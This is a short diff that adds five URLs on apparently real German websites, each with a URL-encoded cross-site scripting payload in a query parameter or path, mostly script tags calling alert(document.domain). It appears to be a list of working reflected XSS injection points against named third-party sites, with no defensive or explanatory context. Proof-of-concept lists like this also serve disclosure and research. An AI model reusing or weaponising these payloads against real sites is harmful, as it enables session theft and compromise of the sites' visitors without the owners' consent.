@@ -1,0 +1,5 @@
+http://bridgestone.motorrad-daten.de/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+http://brieffreunde-finden.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://bs4you.de/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+http://buchung.mennotel.de.b03.online-netz.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://buecheronlineshop.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
